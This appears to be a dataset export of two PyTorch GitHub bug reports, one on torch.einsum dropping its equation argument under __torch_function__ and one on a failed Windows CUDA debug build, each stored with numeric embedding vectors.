 -0.21893689  0.11999053  0.2087766  -0.4499399  -0.4464599  -0.27132243
  0.14527553 -0.24312778 -0.14311233 -0.23568149  0.33499166 -0.09211852
 -0.29052082 -0.00815771  0.11811081 -0.15018907  0.00937219 -0.22020411
 -0.16797854  0.09297309  0.15888621  0.00384056  0.05765273 -0.11679406
  0.23691005  0.20907694  0.37842494 -0.44822317  0.471267   -0.00231277
 -0.17696768  0.32798257 -0.17926355  0.15231992 -0.14822188  0.0309766
  0.10002016  0.05023819  0.07864833 -0.13571669 -0.25804767  0.13527048
 -0.07524209  0.13454512 -0.32872695 -0.29364234 -0.14027944 -0.07499236
  0.08040155  0.01757961  0.13901685  0.11186408 -0.2686544  -0.28306395
 -0.30987275  0.36364415  0.02871488 -0.30423564 -0.30715007  0.02930508
  0.02412456 -0.08564916 -0.03136111 -0.17586634  0.3829583   0.27448106
 -0.09303806 -0.12823547 -0.3308639   0.05485627  0.16317134  0.16319805
 -0.12074687  0.3793416  -0.13403982  0.16253099  0.17025143  0.23340094
 -0.14527868  0.14569303 -0.3099502  -0.16667432  0.21975255  0.13513193
 -0.10838121 -0.03039528  0.19727772  0.14340839  0.02098976  0.22905445
  0.05023504  0.13788837  0.35530856 -0.4510727  -0.08930232 -0.24981457
  0.05525514 -0.23172642  0.20472452  0.16685845 -0.08701672 -0.2399385 ]"
torch.einsum does not pass equation argument to __torch_function__ API triaged module: numpy,"## ðŸ› Bug

when delegating torch.einsum call to an object which implements
`__torch_function__` API the equation argument is not passed resulting in the error.
```TypeError: einsum(): argument 'equation' (position 1) must be str, not Tensor```

this was tested on pytorch 1.5.0

I've actually found the cause of this bug and have written a fix.

the following script illustrates the problem and the proposed solution

## To Reproduce

```python 
import torch

class Wrapper():
    def __init__(self,data):
        self.data = data
    
    def __torch_function__(self, func, types, args=(), kwargs=None):
        if kwargs is None:
            kwargs = {}

        #unwrap inputs if necessary
        def unwrap(v):
            return v.data if isinstance(v,Wrapper) else v
        args = map(unwrap,args)
        kwargs = {k:unwrap(v) for k,v in kwargs.items()}

        return func(*args, **kwargs)



# fixed einsum implementation
from torch import Tensor,_VF
from torch._overrides import has_torch_function,handle_torch_function
def fixed_einsum(equation,*operands):
    if not torch.jit.is_scripting():
        if any(type(t) is not Tensor for t in operands) and has_torch_function(operands):
            # equation is not passed
            # return handle_torch_function(einsum, operands, *operands)
            return handle_torch_function(fixed_einsum, operands, equation,*operands)
    if len(operands) == 1 and isinstance(operands[0], (list, tuple)):
        # the old interface of passing the operands as one list argument
        operands = operands[0]

        # recurse incase operands contains value that has torch function
        #in the original implementation this line is omitted
        return fixed_einsum(equation,*operands)

    return _VF.einsum(equation, operands)


if __name__ == ""__main__"":
    print(torch.__version__)
    # uncomment to use fixed einsum
    # torch.einsum = fixed_einsum

    #operands are wrapped
    x = Wrapper(torch.randn(5))
    y = Wrapper(torch.randn(4))
    assert torch.allclose(torch.einsum('i,j->ij',x, y),torch.ger(x,y))  # outer product
    print(""works with wrapped inputs"")    

    #old interface operands is a list
    a = Wrapper(torch.randn(2,3))
    b = Wrapper(torch.randn(5,3,7))
    c = Wrapper(torch.randn(2,7))
    assert torch.allclose(torch.einsum('ik,jkl,il->ij', [a, b, c]),torch.nn.functional.bilinear(a,c,b)) # bilinear interpolation
    print(""works with old API operands is list"")
    
    #equation is wrapped
    As = Wrapper(torch.randn(3,2,5))
    Bs = Wrapper(torch.randn(3,5,4))
    equation = Wrapper('bij,bjk->bik')
    assert torch.allclose(torch.einsum(equation, As, Bs),torch.matmul(As,Bs)) # batch matrix multiplication
    print(""works with equation wrapped"")

    #see that it also works with plain tensors
    x = torch.randn(5)
    y = torch.randn(4)
    assert torch.allclose(torch.einsum('i,j->ij',x, y),torch.ger(x,y)) 
    print(""works with no wrapped values"")



```


cc @albanD @mruberry",True,"[-4.85787481e-01  3.28334063e-01 -1.87089026e-01  2.94996738e-01
  2.05886558e-01 -1.15199257e-02  1.23223826e-01  1.87032700e-01
 -1.90940276e-01 -2.75233060e-01 -6.66620135e-02 -3.13560903e-01
 -4.40620780e-01  1.78956196e-01  4.21947122e-01  1.15369186e-01
 -3.29808265e-01 -1.78768128e-01 -2.11718008e-02 -4.23505723e-01
  2.13124275e-01  1.00622950e-02 -1.32033527e-01 -5.30905500e-02
 -2.67029494e-01  2.23604709e-01 -2.05103278e-01 -1.76106229e-01
  3.56221646e-01  2.08270147e-01  1.52978860e-03 -2.11559564e-01
 -5.87637484e-01  3.45394015e-02  2.34708622e-01 -1.86370928e-02
 -4.76542205e-01 -5.15513904e-02 -2.19588935e-01  1.96493208e-01
  1.02383301e-01  1.93823859e-01 -8.75357836e-02 -1.67465836e-01
  1.29029453e-01 -4.24269214e-02 -7.11712688e-02  1.67571217e-01
 -1.57714158e-01 -1.62818402e-01 -1.34566963e-01  2.90599227e-01
 -2.22242456e-02  7.05158338e-02  6.68649189e-03 -2.23428845e-01
 -2.09354818e-01  1.84109300e-01  1.49467841e-01 -1.68401301e-01
  2.57228255e-01  3.91802303e-02  3.84945571e-02 -1.62120953e-01
 -9.90206450e-02 -2.09742352e-01 -1.06589615e-01  6.86782748e-02
  2.57123888e-01  1.59957111e-01  2.08297968e-01 -1.22796431e-01
  1.23160556e-01 -3.77139971e-02  1.62327528e-01 -1.66157156e-01
 -6.59775257e-01  2.12130383e-01 -3.18884313e-01 -8.54673460e-02
  1.42784894e-01  6.14798367e-02 -2.75649130e-01  1.47631004e-01
  8.31589997e-02 -1.76716626e-01  9.05888006e-02 -1.59445047e-01
  4.45736766e-01  8.64526033e-02  3.24859738e-01 -1.68244764e-01
 -8.00433606e-02  2.27956682e-01  1.81211025e-01  1.26337588e-01
 -1.79560401e-03  7.39285126e-02 -2.13949725e-01 -5.20112395e-01
 -1.94737092e-01 -5.26771724e-01 -2.00694859e-01  3.43839854e-01
  1.69311956e-01  2.61481792e-01  4.11874838e-02  2.31254488e-01
  3.40383768e-01 -3.85758102e-01  5.92323169e-02  9.09995884e-02
  1.18638717e-01 -8.95964056e-02 -9.51002687e-02 -7.48483315e-02
 -9.73400250e-02 -1.93952769e-01 -1.94094449e-01  2.11539149e-01
  3.94039631e-01  6.52468577e-02 -1.24555022e-01  5.21899939e-01
  2.30048165e-01  7.36669302e-02 -6.09394424e-02  4.60753217e-02
  2.31192574e-01  4.45955098e-02  2.41044298e-01 -9.59955305e-02
  1.69837013e-01 -9.51340497e-02  3.41686606e-01  3.70802850e-01
 -3.42327714e-01  2.06720114e-01  4.00729030e-02 -4.65460867e-02
 -7.81188533e-02 -5.21603897e-02 -1.03775330e-01 -2.34046310e-01
  1.86576590e-01 -1.78527281e-01 -1.45785064e-01 -8.10725242e-03
  1.41078308e-01 -1.39278322e-01 -5.37569374e-02  1.19526304e-01
 -3.85345638e-01  5.30553460e-01  2.04183049e-02 -1.01089247e-01
  1.42537147e-01 -4.56647053e-02  3.63352239e-01 -3.30090880e-01
  2.68823862e-01  1.87867194e-01  3.50115240e-01  3.94040346e-01
  2.54353344e-01  1.94521129e-01 -1.50469035e-01 -1.89386949e-01
 -6.35189652e-01 -6.67784512e-02 -6.47838116e-02 -6.54115602e-02
 -9.99786556e-02 -2.07768053e-01  6.73936754e-02  1.21330753e-01
  1.58797756e-01 -3.01934898e-01 -3.37938875e-01  4.91613328e-01
  6.27115250e-01  7.18483865e-01  4.40027952e-01  1.48512214e-01
 -1.77926701e-02  3.10936928e-01  1.16579622e-01 -3.87474932e-02
  7.43655413e-02  2.40623087e-01 -5.00529468e-01 -1.59796357e-01
 -2.17377059e-02  9.10328031e-02 -2.07960196e-02  4.24892277e-01
  7.26393759e-02 -3.01579595e-01 -7.77042061e-02  1.00026205e-01
 -1.71095937e-01  1.51349887e-01  6.14373088e-02 -5.12123331e-02
  1.00366831e-01 -2.74259802e-02 -8.92691612e-02 -5.35300612e-01
 -3.84430498e-01 -1.22667313e-01  5.41160777e-02 -9.09524187e-02
 -2.42816687e-01 -1.35042757e-01 -3.75319943e-02  1.53446674e-01
  1.00128651e-02 -1.46768272e-01 -2.29023583e-03  2.73975611e-01
  1.97678238e-01  1.89966470e-01 -7.98542574e-02 -1.85885280e-01
 -2.55751461e-02  1.01097785e-01 -3.46573353e-01 -1.16376176e-01
  3.13992500e-02 -1.03951097e-01 -1.87980860e-01 -2.76766121e-01
  9.73982066e-02  2.58994967e-01  1.66120499e-01  7.86544383e-02
 -2.57747829e-01 -9.04430449e-02  1.05647177e-01 -1.41316310e-01
 -3.72891337e-01  2.23885216e-02  1.68022811e-02 -1.63254082e-01
 -2.51669109e-01  8.65701586e-05  6.04295284e-02 -2.22624063e-01
 -2.50244617e-01  3.36769074e-02  7.62132406e-02 -3.53303924e-02
 -4.95704301e-02 -9.30528641e-02  2.87709892e-01  1.59028083e-01
  1.90805823e-01 -1.54366255e-01 -1.18947588e-01 -1.98561013e-01
 -1.90731704e-01  2.02409685e-01  1.14090875e-01  1.46234427e-02
  1.30484283e-01  1.09082624e-01  2.57133663e-01  1.90411180e-01
  7.96362385e-02  2.30155468e-01  1.20106369e-01 -4.46341544e-01
  6.36006951e-01 -1.45960134e-02  1.82379693e-01 -5.28930366e-01
  2.09229976e-01  2.20909715e-01 -6.34189025e-02 -1.48840427e-01
  1.50759265e-01  2.91831255e-01 -9.88897383e-02  2.39332765e-01
  3.13586086e-01 -1.13535285e-01  1.05330117e-01 -8.19763169e-03
 -4.39385064e-02 -4.22201484e-01 -4.84021097e-01 -7.21041337e-02
  6.47371292e-01 -7.62389451e-02 -2.61381924e-01  2.33458310e-01
 -1.99529715e-02 -1.91611975e-01 -1.79461371e-02  3.69897395e-01
 -2.44998448e-02  3.27079803e-01  9.39179212e-02 -1.67528614e-01
 -6.63212463e-02  7.91364536e-03  1.50731534e-01 -2.74036407e-01
  4.09013927e-01 -4.60267127e-01  1.77008227e-01 -9.03488472e-02
 -3.43112111e-01  4.14432347e-01 -1.73958212e-01  1.32428229e-01
 -1.62781879e-01  2.29610175e-01  2.85537541e-01  5.61720058e-02
 -5.17283939e-02 -3.05958331e-01 -1.81904331e-01  2.20183283e-04
  1.47379451e-02 -8.51120949e-02 -2.01142147e-01 -3.87192927e-02
 -1.13374449e-01  6.19724691e-02  1.31013822e-02  1.41406372e-01
  2.74366021e-01  9.59945545e-02 -3.22213352e-01 -3.10125887e-01
 -1.83952808e-01  4.53331351e-01  8.88514072e-02 -1.29609704e-01
 -2.91105032e-01 -9.48311687e-02 -6.47174120e-02 -2.21655577e-01
 -6.46700710e-02 -4.69153702e-01  1.09726965e-01  1.28015116e-01
 -1.13137588e-01 -5.00548594e-02 -4.98174839e-02  8.87090117e-02
  1.95158035e-01  3.30777705e-01  1.95859373e-01  1.77969724e-01
 -2.07633913e-01  1.22410268e-01 -1.40022308e-01  8.38640630e-02
 -1.48660839e-01  3.35350811e-01 -3.49226028e-01 -1.76344365e-01
  2.59300828e-01 -9.28984508e-02  6.44117147e-02 -3.99350300e-02
  8.16680640e-02  3.16386402e-01 -4.56997871e-01  1.02024026e-01
 -1.34843931e-01 -2.39896737e-02  3.42377365e-01 -1.45699322e-01
  2.37149000e-01 -1.22072466e-01  1.61870062e-01 -4.93079662e-01
  1.07750788e-01 -1.36838965e-02  1.27947360e-01  2.04146087e-01]"
CUDA debug build failed on Windows high priority module: build module: windows triaged,"## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->
Error text:
```
[2034/2674] Building NVCC (Device) object caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj
FAILED: caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj 
cmd.exe /C ""cd /D C:\w\b\windows\pytorch\build\build\caffe2\CMakeFiles\torch_cuda.dir\utils && C:\w\b\windows\conda\envs\py37\Library\bin\cmake.exe -E make_directory C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/. && C:\w\b\windows\conda\envs\py37\Library\bin\cmake.exe -D verbose:BOOL=OFF -D build_configuration:STRING=Debug -D generated_file:STRING=C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj -D generated_cubin_file:STRING=C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj.cubin.txt -P C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj.Debug.cmake""
math_gpu.cu
C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

24 errors detected in the compilation of ""C:/Users/circleci/AppData/Local/Temp/tmpxft_0000018c_00000000-12_math_gpu.compute_75.cpp1.ii"".
math_gpu.cu
CMake Error at torch_cuda_generated_math_gpu.cu.obj.Debug.cmake:281 (message):
  Error generating file
  C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj
```
See https://app.circleci.com/pipelines/github/pytorch/pytorch/165899/workflows/977c46e5-2bfd-4a99-aa57-e6ce50d20cfc/jobs/5383261.

## To Reproduce

Steps to reproduce the behavior:

1. set DEBUG=1
2. python tools/build_libtorch.py

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

Build pass.

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): master
 - OS (e.g., Linux): Windows
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): python tools/build_libtorch.py
 - Python version: 3.7
 - CUDA/cuDNN version: CUDA 9.2/10.1/10.2
 - GPU models and configuration: Tesla T4
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @malfet @peterjc123 @nbcsm @guyang3532",True,"[-1.53177410e-01 -2.32923001e-01 -3.26359510e-01  2.95465291e-01
  3.35369967e-02 -1.42553270e-01 -3.16439092e-01  2.04981282e-01
 -3.45505297e-01  1.43431975e-02 -1.29068464e-01 -4.54852670e-01
  1.04823798e-01 -2.83501685e-01 -2.03463614e-01  1.17893219e-01
 -1.84797794e-01  1.12642664e-02  4.83588353e-02  1.70334131e-02
 -8.10623765e-02  3.62952463e-02 -4.08355355e-01 -1.09756827e-01
  3.91684592e-01  2.88199902e-01 -2.98834980e-01 -1.46216780e-01
  2.88730294e-01  4.01635766e-02  1.84068263e-01 -1.06002197e-01
  7.98460096e-02  1.74672380e-01  3.88266295e-01 -1.44486815e-01
 -2.88544685e-01 -2.52146542e-01 -1.47502022e-02 -2.67612457e-01
 -1.53964549e-01 -3.95471230e-02 -4.63182703e-02 -5.86368553e-02
 -2.37862140e-01 -9.83855128e-02 -2.04869658e-01  1.76453799e-01
 -1.04893588e-01 -2.26594023e-02 -4.06186059e-02  2.17113167e-01
 -8.56752992e-02 -2.49547601e-01  1.29668847e-01 -1.70742854e-01
 -1.86256289e-01  2.23990738e-01  9.05622989e-02  1.04012623e-01
  2.97549695e-01 -1.39781475e-01  1.67889640e-01 -9.02824551e-02
 -8.38942379e-02  2.04372346e-01 -3.09677005e-01  1.25175998e-01
  3.58734220e-01 -1.50221795e-01  1.30543977e-01  1.39617682e-01
 -1.35602146e-01 -3.70246887e-01  9.29502323e-02  2.37084463e-01
 -2.55590051e-01  2.10125268e-01 -2.44995296e-01  3.90056446e-02
  1.25822112e-01  4.13447827e-01 -8.60312432e-02 -2.25733399e-01
  3.42913657e-01  3.67380865e-02  3.25044185e-01 -2.26835594e-01
  1.59654245e-01 -1.87395424e-01  3.59787643e-01  2.38033444e-01
  2.18584925e-01  3.71971965e-01 -1.94682300e-01 -7.01525956e-02
 -1.64452791e-02 -1.53279632e-01 -4.20594841e-01 -4.16004539e-01
 -9.34144109e-02 -2.18735486e-01 -1.69405490e-01  5.09661913e-01
 -2.79197544e-01 -2.25544959e-01  3.92159700e-01  1.23423859e-01
 -4.02755141e-02 -5.79277053e-02  3.65470201e-01 -3.34948823e-02
 -2.15868264e-01 -1.84591934e-01  1.09568015e-01  1.22721344e-01
 -4.44429696e-01 -4.13082212e-01 -2.46076375e-01  1.97484404e-01
 -1.01149283e-01  1.01771951e-03  3.00485641e-04 -1.62912801e-01
  1.61205620e-01 -6.85391054e-02  2.94370234e-01 -1.55337095e-01
 -2.87942290e-01 -3.76385599e-02 -1.88817130e-03  2.82320082e-01
  4.31883931e-01 -5.24369068e-02  1.56815812e-01  4.37295914e-01
 -3.02612484e-01 -1.11521855e-01 -8.26320499e-02 -9.02833268e-02
 -1.53789014e-01  2.50404716e-01 -2.10060459e-03 -3.88917178e-01
  2.76909888e-01 -1.67857081e-01 -3.05966645e-01  9.71599743e-02
  2.05752552e-01  2.98865616e-01  1.96586475e-01  4.99085225e-02
 -4.61276114e-01  6.53121114e-01  9.73264799e-02  1.22033753e-01
  3.77546370e-01  1.35039434e-01  2.87697073e-02 -4.97632265e-01
  1.96380079e-01  2.90513217e-01 -5.29021472e-02  2.02027276e-01
 -4.32412699e-02  5.86588681e-02 -3.15554738e-01  1.34160981e-01
 -1.29675239e-01  1.96492076e-01 -1.07287019e-01 -2.29127035e-02
  2.31141269e-01 -7.43155479e-02  1.90182254e-01 -2.81802177e-01
 -1.18864119e-01 -2.23997235e-03  3.09092961e-02  4.96484041e-01
  2.09752053e-01  6.10241055e-01  3.81820142e-01 -1.73082128e-01
  1.36668965e-01  2.39665955e-01  2.57826656e-01 -6.46603666e-03
 -5.55522069e-02 -1.59634724e-01 -4.07623529e-01 -3.41022462e-02
  5.97110763e-02 -4.30813283e-02 -6.52095973e-02  3.09729576e-01
  3.24786335e-01  6.16256706e-03  1.08983114e-01 -1.13521986e-01
 -2.68771827e-01  1.44171476e-01  7.89428502e-02  1.01937249e-01
 -1.89296857e-01 -3.06851733e-02 -2.95586586e-01 -2.88262039e-01
  4.52698991e-02  7.05484152e-02 -4.27534670e-01 -3.96176755e-01
 -8.95325914e-02 -9.76665467e-02 -7.12178349e-02  5.19848704e-01
